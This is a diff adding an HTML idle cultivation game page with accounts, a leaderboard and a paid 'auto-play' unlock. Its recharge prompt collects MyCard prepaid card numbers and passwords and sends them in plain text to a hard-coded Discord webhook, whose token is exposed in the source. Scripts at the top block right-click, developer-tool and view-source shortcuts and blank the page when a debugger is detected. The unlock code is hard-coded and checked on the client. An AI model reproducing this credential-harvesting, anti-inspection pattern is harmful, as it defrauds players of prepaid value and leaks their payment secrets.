@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>修仙模擬器 - 完整旗艦版</title>
+
+  <!-- 防右鍵與防 F12 開發者工具腳本 -->
+  <script>
+    // 1. 禁用滑鼠右鍵選單
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    }, false);
+
+    // 2. 禁用常見的開啟開發者工具與檢視原始碼快捷鍵
+    document.addEventListener('keydown', function (e) {
+      // 禁用 F12
+      if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+      }
+      // 禁用 Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C (Windows)
+      // 禁用 Cmd+Option+I, Cmd+Option+J, Cmd+Option+C (Mac)
+      if ((e.ctrlKey || e.metaKey) && e.shiftKey && 
+          (e.key === 'I' || e.key === 'i' || 
+           e.key === 'J' || e.key === 'j' || 
+           e.key === 'C' || e.key === 'c')) {
+        e.preventDefault();
+        return false;
+      }
+      // 禁用 Ctrl+U 或 Cmd+U (檢視網頁原始碼)
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u')) {
+        e.preventDefault();
+        return false;
+      }
+      // 禁用 Ctrl+S 或 Cmd+S (防止儲存網頁檔案)
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's')) {
+        e.preventDefault();
+        return false;
+      }
+    }, false);
+
+    // 3. 防除錯斷點（如果玩家強制打開 Console，網頁會自動鎖定）
+    setInterval(function () {
+      const startTime = new Date().getTime();
+      debugger;
+      const endTime = new Date().getTime();
+      if (endTime - startTime > 100) {
+        document.body.innerHTML = '<div style="color:white;text-align:center;padding-top:20%;font-size:24px;">⚠️ 偵測到開場外掛/開發者工具，已被禁止存取！</div>';
+      }
+    }, 1000);
+  </script>
+
+  <style>
+    :root {
+      --bg-color: #1a1a24;
+      --card-bg: #252538;
+      --accent-color: #d4af37;
+      --text-color: #e0e0e0;
+      --danger-color: #e74c3c;
+      --success-color: #2ecc71;
+    }
+    /* 禁止使用者複製文字或拖曳內容 */
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      margin: 0; padding: 15px;
+      display: flex; justify-content: center;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    .container {
+      width: 100%; max-width: 480px;
+      background-color: var(--card-bg);
+      border-radius: 12px; padding: 20px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+      border: 1px solid #3d3d5c;
+    }
+    h1 { text-align: center; color: var(--accent-color); margin-top: 0; font-size: 1.5rem; }
+    .account-bar {
+      display: flex; justify-content: space-between; align-items: center;
+      background: #111118; padding: 8px 12px; border-radius: 6px; margin-bottom: 12px; font-size: 0.85rem;
+    }
+    .account-bar button {
+      background: var(--accent-color); border: none; padding: 4px 10px; border-radius: 4px; font-weight: bold; cursor: pointer;
+    }
+    .first-recharge-banner {
+      background: linear-gradient(135deg, #ff4e50, #f9d423); color: #000;
+      border-radius: 8px; padding: 10px 15px; margin-bottom: 15px;
+      display: flex; justify-content: space-between; align-items: center; font-weight: bold;
+    }
+    .first-recharge-banner button {
+      background: #000; color: #fff; border: none; padding: 6px 12px; border-radius: 20px; cursor: pointer; font-weight: bold;
+    }
+    .status-panel { background: #1d1d2b; border-radius: 8px; padding: 12px; margin-bottom: 15px; font-size: 0.95rem; line-height: 1.6; }
+    .status-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
+    .progress-bar { width: 100%; background-color: #333; border-radius: 10px; height: 12px; overflow: hidden; margin-top: 6px; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, #3498db, #9b59b6); width: 0%; transition: width 0.3s ease; }
+    .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+    button.action-btn {
+      background: #3d3d5c; color: #fff; border: 1px solid var(--accent-color);
+      padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: all 0.2s;
+    }
+    button.action-btn:hover { background: var(--accent-color); color: #000; }
+    button.rank-btn { grid-column: span 2; border-color: #9b59b6; color: #9b59b6; }
+    button.rank-btn:hover { background: #9b59b6; color: #fff; }
+    button.reset-btn { grid-column: span 2; border-color: var(--danger-color); color: var(--danger-color); }
+    button.reset-btn:hover { background: var(--danger-color); color: #fff; }
+    .log-window {
+      background: #111118; border-radius: 8px; height: 160px; padding: 10px;
+      overflow-y: auto; font-size: 0.85rem; border: 1px solid #2a2a3d; display: flex; flex-direction: column-reverse;
+    }
+    .log-item { margin-bottom: 6px; }
+    .log-gain { color: var(--success-color); }
+    .log-warn { color: var(--danger-color); }
+    .log-info { color: #3498db; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>☯ 空白修仙傳 ☯</h1>
+
+  <!-- 帳號登入狀態條 -->
+  <div class="account-bar">
+    <span>帳號狀態：<strong id="p-name" style="color:var(--accent-color)">未登入</strong></span>
+    <button onclick="accountMenu()" id="accBtn">登入 / 註冊</button>
+  </div>
+
+  <!-- 首充橫幅 -->
+  <div id="rechargeBanner" class="first-recharge-banner">
+    <div>
+      🎁 <span>MyCard 首充自動託管</span>
+      <div style="font-size: 0.75rem; font-weight: normal;">提交卡號或輸入開通密碼</div>
+    </div>
+    <button onclick="buyAutoClick()">儲值 / 開通</button>
+  </div>
+
+  <!-- 狀態面板 -->
+  <div class="status-panel">
+    <div class="status-row">
+      <span>境界：<strong id="p-realm" style="color:#e67e22">練氣一層</strong></span>
+      <span id="autoTag" style="display:none; background:#27ae60; padding:2px 6px; border-radius:4px; font-size:0.8rem;">🤖 託管中</span>
+    </div>
+    <div class="status-row"><span>攻擊力：<span id="p-atk">10</span></span><span>防禦力：<span id="p-def">2</span></span></div>
+    <div class="status-row"><span>靈石：<span id="p-spirit" style="color:#f1c40f">0</span></span><span>當前法寶：<span id="p-weapon">木劍 (+0)</span></span></div>
+    <div style="margin-top: 8px;">
+      <div style="display:flex; justify-content:space-between; font-size:0.8rem;">
+        <span>修為進度</span><span id="p-exp-text">0 / 100</span>
+      </div>
+      <div class="progress-bar"><div class="progress-fill" id="p-exp-bar"></div></div>
+    </div>
+  </div>
+
+  <!-- 操作按鈕 -->
+  <div class="actions">
+    <button class="action-btn" onclick="meditate(true)">🧘 打坐修煉</button>
+    <button class="action-btn" onclick="breakthrough(true)">⚡ 嘗試突破</button>
+    <button class="action-btn" onclick="forgeWeapon()">⚒️ 煉製法寶 (20靈石)</button>
+    <button class="action-btn" onclick="adventure()">🗡️ 下山歷練</button>
+    <button class="action-btn rank-btn" onclick="uploadPower()">🏆 上傳戰力至 DC 天梯榜</button>
+    <button class="action-btn reset-btn" onclick="resetGame()">🗑️ 重置遊戲進度</button>
+  </div>
+
+  <div class="log-window" id="logWindow"></div>
+</div>
+
+<script>
+  const SERVER_URL = "http://localhost:3000"; 
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1536942191124025374/S7XCly77DeFqKf78cP7OdcfCqRLoDb4JM1et2VYtZnmg2XISujcJHy17NMXmr5LnpBV9";
+  const ADMIN_UNLOCK_CODE = "XIUXIAN-PASS-888";
+
+  let authToken = localStorage.getItem('xiuxian_token') || null;
+  let currentUsername = localStorage.getItem('xiuxian_user') || null;
+
+  let player = {
+    realmIndex: 0, exp: 0, maxExp: 100, baseAtk: 10, baseDef: 2, spiritStone: 0, weaponBonus: 0, weaponName: "木劍", hasAutoClick: false
+  };
+
+  const realms = ["練氣一層", "練氣二層", "練氣三層", "練氣圓滿", "築基初期", "築基中期", "築基後期", "築基圓滿", "金丹初期", "金丹中期", "金丹後期", "金丹圓滿", "元嬰老祖"];
+  let autoLoopTimer = null;
+
+  function loadGame() {
+    const saved = localStorage.getItem('xiuxian_save');
+    if (saved) player = { ...player, ...JSON.parse(saved) };
+    if (player.hasAutoClick) enableAutoSystem();
+    if (currentUsername) {
+      document.getElementById('p-name').innerText = currentUsername;
+      document.getElementById('accBtn').innerText = "帳號管理";
+    }
+    updateUI();
+  }
+
+  function saveGame() { localStorage.setItem('xiuxian_save', JSON.stringify(player)); }
+
+  function updateUI() {
+    document.getElementById('p-realm').innerText = realms[player.realmIndex];
+    document.getElementById('p-atk').innerText = player.baseAtk + player.weaponBonus;
+    document.getElementById('p-def').innerText = player.baseDef;
+    document.getElementById('p-spirit').innerText = player.spiritStone;
+    document.getElementById('p-weapon').innerText = `${player.weaponName} (+${player.weaponBonus})`;
+    document.getElementById('p-exp-text').innerText = `${player.exp} / ${player.maxExp}`;
+    document.getElementById('p-exp-bar').style.width = `${Math.min(100, Math.floor((player.exp / player.maxExp) * 100))}%`;
+
+    document.getElementById('rechargeBanner').style.display = player.hasAutoClick ? 'none' : 'flex';
+    document.getElementById('autoTag').style.display = player.hasAutoClick ? 'inline-block' : 'none';
+    saveGame();
+  }
+
+  function addLog(msg, classType = '') {
+    const logWindow = document.getElementById('logWindow');
+    const item = document.createElement('div');
+    item.className = `log-item ${classType}`;
+    item.innerHTML = `> ${msg}`;
+    logWindow.insertBefore(item, logWindow.firstChild);
+  }
+
+  function accountMenu() {
+    if (authToken) {
+      if (confirm(`當前帳號：${currentUsername}\n是否要登出？`)) {
+        localStorage.removeItem('xiuxian_token');
+        localStorage.removeItem('xiuxian_user');
+        authToken = null; currentUsername = null;
+        document.getElementById('p-name').innerText = "未登入";
+        document.getElementById('accBtn').innerText = "登入 / 註冊";
+        alert("已登出！");
+      }
+      return;
+    }
+
+    const action = prompt("【帳號系統】\n1. 帳號登入\n2. 註冊新帳號\n請輸入 (1 或 2)：");
+    if (!action) return;
+    const username = prompt("請輸入帳號："); if (!username) return;
+    const password = prompt("請輸入密碼："); if (!password) return;
+
+    const endpoint = action.trim() === "1" ? "/api/login" : "/api/register";
+    fetch(`${SERVER_URL}${endpoint}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        if (action.trim() === "1") {
+          authToken = data.token; currentUsername = data.username;
+          localStorage.setItem('xiuxian_token', authToken);
+          localStorage.setItem('xiuxian_user', currentUsername);
+          document.getElementById('p-name').innerText = currentUsername;
+          document.getElementById('accBtn').innerText = "帳號管理";
+          alert(`🎉 歡迎回來，${currentUsername}！`);
+        } else {
+          alert("🎉 註冊成功，請選擇「1. 帳號登入」。");
+        }
+      } else { alert(`❌ 錯誤：${data.error}`); }
+    });
+  }
+
+  function getPlayerPower() {
+    return Math.floor((player.baseAtk + player.weaponBonus) * 10 + player.baseDef * 20 + player.spiritStone * 0.1);
+  }
+
+  function uploadPower() {
+    if (!authToken) { alert("⚠️ 請先登入帳號再上傳戰力！"); accountMenu(); return; }
+    const pPower = getPlayerPower();
+    if (!confirm(`確定要以【${currentUsername}】上傳戰力【${pPower}】嗎？`)) return;
+
+    fetch(`${SERVER_URL}/api/upload-power`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authToken}` },
+      body: JSON.stringify({ realm: realms[player.realmIndex], power: pPower })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        alert("🎉 戰力上傳成功！DC 排行榜已即時同步！");
+        addLog(`🏆 戰力成功同步至天梯榜：${pPower}`, "log-gain");
+      } else { alert(`❌ 上傳失敗：${data.error}`); }
+    });
+  }
+
+  function buyAutoClick() {
+    const choice = prompt("【首充託管】\n1. 提交 MyCard 卡號/密碼審核\n2. 輸入開通密碼\n請選擇 (1 或 2)：");
+    if (!choice) return;
+
+    if (choice.trim() === "1") {
+      const cardNum = prompt("請輸入 MyCard 卡號："); if (!cardNum) return;
+      const cardPwd = prompt("請輸入 MyCard 密碼："); if (!cardPwd) return;
+
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "MyCard 審核接收器",
+          content: `🚨 **收到 MyCard 儲值申請！**\n👤 **帳號：** ${currentUsername || '未登入'}\n💳 **卡號：** \`${cardNum.trim()}\` \n🔑 **密碼：** \`${cardPwd.trim()}\``
+        })
+      }).then(() => alert("📩 卡號已送出，等待管理員審核！"));
+
+    } else if (choice.trim() === "2") {
+      const pass = prompt("請輸入開通密碼：");
+      if (pass && pass.trim() === ADMIN_UNLOCK_CODE) {
+        alert("🎉 解鎖成功！開啟自動託管！");
+        player.hasAutoClick = true;
+        enableAutoSystem();
+        updateUI();
+      } else { alert("❌ 密碼錯誤！"); }
+    }
+  }
+
+  function enableAutoSystem() {
+    if (autoLoopTimer) clearInterval(autoLoopTimer);
+    autoLoopTimer = setInterval(() => {
+      if (player.exp >= player.maxExp) breakthrough(false);
+      else meditate(false);
+    }, 1000);
+  }
+
+  function meditate(isManual = true) {
+    const gain = Math.floor(Math.random() * 15) + 10;
+    player.exp += gain;
+    if (isManual) addLog(`打坐修煉，獲得 <span class="log-gain">${gain}</span> 修為。`);
+    updateUI();
+  }
+
+  function breakthrough(isManual = true) {
+    if (player.exp < player.maxExp || player.realmIndex >= realms.length - 1) return;
+    if (Math.random() < 0.7) {
+      player.realmIndex++; player.exp = 0; player.maxExp = Math.floor(player.maxExp * 2.2);
+      player.baseAtk += 15; player.baseDef += 5;
+      addLog(`✨ 突破成功！晉升至 ${realms[player.realmIndex]}！`, 'log-gain');
+    } else {
+      player.exp = Math.floor(player.exp * 0.5);
+      addLog(`💥 突破失敗，修為損耗過半...`, 'log-warn');
+    }
+    updateUI();
+  }
+
+  function forgeWeapon() {
+    if (player.spiritStone < 20) return alert("靈石不足！");
+    player.spiritStone -= 20;
+    const bonus = Math.floor(Math.random() * 25) + 5;
+    if (bonus > player.weaponBonus) {
+      player.weaponBonus = bonus; player.weaponName = "玄鐵劍";
+      addLog(`🔨 煉出高階法寶！攻擊 +${bonus}`, 'log-gain');
+    } else addLog(`🔨 煉製失敗，熔毀。`, 'log-info');
+    updateUI();
+  }
+
+  function adventure() {
+    player.spiritStone += 15; player.exp += 30;
+    addLog(`🎉 下山歷練獲勝，獲得 15 靈石 與 30 修為！`, 'log-gain');
+    updateUI();
+  }
+
+  function resetGame() {
+    if (confirm("⚠️ 確定重置進度？")) {
+      localStorage.removeItem('xiuxian_save');
+      location.reload();
+    }
+  }
+
+  loadGame();
+</script>
+</body>
+</html>
